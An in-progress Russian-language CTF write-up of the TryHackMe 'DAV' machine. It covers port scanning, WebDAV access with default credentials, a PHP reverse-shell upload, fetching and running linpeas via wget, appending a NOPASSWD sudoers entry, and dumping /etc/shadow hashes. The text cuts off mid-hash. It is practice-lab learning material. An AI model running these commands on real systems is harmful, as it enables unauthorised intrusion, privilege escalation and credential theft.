# 🖥️ Отчет по машине: DAV

**Дата:** 2026-04-27
**Платформа:** TryHackMe
**Сложность:** Easy
**Статус:** In progress

---

## 📡 1. Разведка 

### Nmap
Первым делом запустил сканирование портов, чтобы увидеть доступные сервисы.

```bash
sudo nmap -sC -sV -A -T4 -p- 10.129.132.16
```
<img width="690" height="258" alt="Снимок экрана 2026-04-27 в 15 49 07" src="https://github.com/user-attachments/assets/af009e62-213f-4acd-b046-8285c3d80289" />

видит только 80 порт проверю иначе возможно порты скрыты либо это подсказка что нужно копать в веб.
```
sudo nmap -sU --top-ports 20 -v 10.129.132.16
```
<img width="314" height="350" alt="Снимок экрана 2026-04-27 в 15 42 16" src="https://github.com/user-attachments/assets/e01d6ca9-8328-4d26-b1dc-515ea86e1b32" />
68 порт, ничего примечательного, стоит сфокусироваться на вебе.

### Порт 80 Стандартная страница сервера Ubuntu
проверю какие папки есть 
dirsearch -u http://ip
<img width="694" height="606" alt="Снимок экрана 2026-04-27 в 16 44 12" src="https://github.com/user-attachments/assets/d28862a9-6d13-424d-b554-5cdcc0b3f75f" />
нашёл /webdav/ (401)

похоже на WebDAV
может поддерживать загрузку файлов

попробую:
- проверить методы
- проверить дефолтные креды
Не совсем дефолтные, но креды из гугла (на старой версии webdev)
Логин: wampp
Пароль: xampp
<img width="524" height="248" alt="Снимок экрана 2026-04-27 в 21 41 28" src="https://github.com/user-attachments/assets/f40732db-a12a-45fe-aba3-f36be4df8e4a" />
в папку dav лежит файл passwd.dav, пытался открыть его через john со словарем rockyou но не вышло пока отложу это
<img width="607" height="67" alt="Снимок экрана 2026-04-27 в 21 55 34" src="https://github.com/user-attachments/assets/352fa5b2-fabe-44e1-b366-ae2df52b1718" />
<img width="687" height="189" alt="Снимок экрана 2026-04-27 в 21 55 43" src="https://github.com/user-attachments/assets/2e1076df-0db0-4b9c-b6c2-326efdc14418" /> 
Узнал что DEV имеет возможность загружать файлы 
```
put namefile
```
Делаем reverse 
в revshells.com вводим ip tun0 и любой порт который буду слушать 
выбираю php monkey
<img width="542" height="499" alt="Снимок экрана 2026-04-27 в 21 45 53" src="https://github.com/user-attachments/assets/602645c4-99f5-4fd1-ab9f-1bc343b4db83" />
я внтури как www-data сразу проверяю кто я и где я 
<img width="695" height="668" alt="Снимок экрана 2026-04-27 в 21 45 21" src="https://github.com/user-attachments/assets/74dd248e-2827-4a02-b71e-fc3465b61a99" />
в папке home есть два пользователя в wamp пусто а в merlin нет и там лежит 1й флаг 
<img width="581" height="497" alt="Снимок экрана 2026-04-27 в 21 54 05" src="https://github.com/user-attachments/assets/a11adb3f-d560-4f9b-a6ab-52c06191af5c" />
```
sudo python3 -m http.server 80 
wget http://ip/linpeas.sh
chmod +x linpeas.sh
./linpeas
```
intratack:

```
echo "www-data ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.bak
sudo su -
sudo: no tty present and no askpass program specified
$ sudo -i
sudo: no tty present and no askpass program specified
```

```
www-data@ubuntu:/$ sudo cat /etc/shadow
sudo cat /etc/shadow
root:!:18134:0:99999:7::: - no pass
merlin:$1$EWeeql.h$8mH.7rEhPRGsOb5ECtmIe1:18134:0:99999:7:::
wampp:$6$f8LMirW0$43znQ5kMsELDO9BdUmhbGkUEnVH2OKXZjfEtsyUgbvL79KoJtgLkdbJpHw4OuDDIMtaXjGjkjaRKD```
